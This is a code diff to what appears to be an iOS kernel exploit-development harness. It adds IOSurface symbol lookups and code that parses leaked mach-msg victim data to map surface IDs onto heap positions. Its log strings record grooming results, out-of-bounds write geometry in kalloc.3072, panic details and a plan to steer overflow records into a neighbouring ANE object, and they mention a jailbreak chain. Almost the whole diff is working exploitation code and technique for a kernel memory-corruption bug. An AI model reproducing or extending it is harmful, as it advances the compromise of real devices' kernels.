@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v3-geomap"
+#define P099_BUILD @"p099-aneprewire-v4-sidresolve"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -96,6 +96,8 @@ static void L(NSString *fmt, ...) {
 
 static void *(*p099_surf_create)(CFDictionaryRef);
 static uint32_t (*p099_surf_getid)(void *);
+static CFTypeRef (*p099_surf_lookup)(uint32_t);
+static size_t (*p099_surf_allocsz)(void *);
 static CFStringRef p099_key_w, p099_key_h, p099_key_bpe, p099_key_bpr, p099_key_alloc;
 
 static BOOL p099_load_iosurface_syms(void) {
@@ -103,6 +105,8 @@ static BOOL p099_load_iosurface_syms(void) {
     if (!f) f = RTLD_DEFAULT;
     p099_surf_create = dlsym(f, "IOSurfaceCreate");
     p099_surf_getid = dlsym(f, "IOSurfaceGetID");
+    p099_surf_lookup = dlsym(f, "IOSurfaceLookup");
+    p099_surf_allocsz = dlsym(f, "IOSurfaceGetAllocSize");
     p099_key_w = dlsym(f, "kIOSurfaceWidth");
     p099_key_h = dlsym(f, "kIOSurfaceHeight");
     p099_key_bpe = dlsym(f, "kIOSurfaceBytesPerElement");
@@ -207,11 +211,16 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
         L(@"GROOMED: OOB lands in freed INLINE mach-msg victims, not gzalloc");
         L(@"metadata. The ungroomed shape is panic #1-#3 (wild write, x25 =");
         L(@"FAR-0xc00, stride 0xc0 = record 0xc0 crossing at +0xc00).");
-        L(@"v3 geomap (Ghidra fffffff00874c070): record = [sid u32][flags][000][tail],");
-        L(@"tail in=0x0000000100000001 out=0x0000000200000001; table 0xc00 (192 recs,");
-        L(@"metadata at +0x800/+0x810), spill starts at record 192 = obj+0xc00 = the");
-        L(@"NEXT kalloc.3072 element. Decode maps sid -> request position -> payload");
-        L(@"offset = the steering geometry. Paste the whole [geom] block back.");
+        L(@"geomap (Ghidra fffffff00874c070): record = [sid u32][flags][000][tail],");
+        L(@"tail in=0x0000000100000001 out=0x0000000200000001; flags = RECORD INDEX.");
+        L(@"v3 tap PROVED: visible spill in a kmsg victim starts at record 195");
+        L(@"(flag 0xc3) at body+0x0000; out record (254, tail {1,2}) at body+0x3b0;");
+        L(@"records 192-194 land in the kmsg kernel-header region (not copied out).");
+        L(@"P034 v2 pin: ANE object kdata = 0x820 (kalloc.3072, band 0x801-0xc00)");
+        L(@"= 0x800 record area (128 slots) + metadata @0x800/0x810; records 128+");
+        L(@"overrun element slack; record 192+ = NEXT element. Consume aim: A rec");
+        L(@"192+k -> B object slot k; A out -> B slot 62 = B input 62 (127-in B).");
+        L(@"v4 resolves record sids via IOSurfaceLookup (LIVE = our own staging).");
         L(@"P046 pins: fill_cap=0 on F77; late cmp at count_off +0x810;");
         L(@"table 0x820, next-chunk 0xc0; n>=0xc1 reaches NEXT 3072.");
         L(@"One evaluation. STANDALONE ONLY - not in JAILBREAK chain.");
@@ -449,12 +458,36 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
                         if (!recN) firstRec = off;
                         lastRec = off;
                         recN++;
-                        L(@"[geom]   +0x%04zx sid=%-10u flags=0x%02x tail=%016llx %s%@",
+                        L(@"[geom]   +0x%04zx sid=%-10u flags=0x%02x tail=%016llx %@%@",
                           off, sid, fl, (unsigned long long)tail, kind,
                           pos >= 0 ? [NSString stringWithFormat:@" pos=%u", pos] : @"");
                     }
                     L(@"[geom] victim=%u records=%d (in=%d out=%d) span=0x%04zx..0x%04zx",
                       i, recN, recIn, recOut, firstRec, lastRec);
+                    /* v4 sid-resolve: IOSurfaceLookup is task-scoped, so LIVE
+                       = our own staging surfaces (sid->size completes the
+                       sid->position map); null = freed or foreign. */
+                    if (dumped == 1 && p099_surf_lookup) {
+                        uint32_t uniq[64]; int nUniq = 0;
+                        for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE && nUniq < 64; off += 16) {
+                            if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
+                            uint64_t t2; memcpy(&t2, actual + off + 8, 8);
+                            if (t2 == 0xEEEEEEEEEEEEEEEEULL) continue;
+                            uint32_t s2; memcpy(&s2, actual + off, 4);
+                            if (!s2) continue;
+                            BOOL seen = NO;
+                            for (int k = 0; k < nUniq; k++) if (uniq[k] == s2) { seen = YES; break; }
+                            if (!seen) uniq[nUniq++] = s2;
+                        }
+                        L(@"[geom] sid-resolve (%d unique):", nUniq);
+                        for (int k = 0; k < nUniq; k++) {
+                            CFTypeRef o = p099_surf_lookup(uniq[k]);
+                            if (!o) { L(@"[geom]   sid=%-10u freed/foreign", uniq[k]); continue; }
+                            size_t asz = p099_surf_allocsz ? (size_t)p099_surf_allocsz((void *)o) : 0;
+                            L(@"[geom]   sid=%-10u LIVE size=%zu", uniq[k], asz);
+                            CFRelease(o);
+                        }
+                    }
                 }
             }
             L(@"=== VERDICT ===");
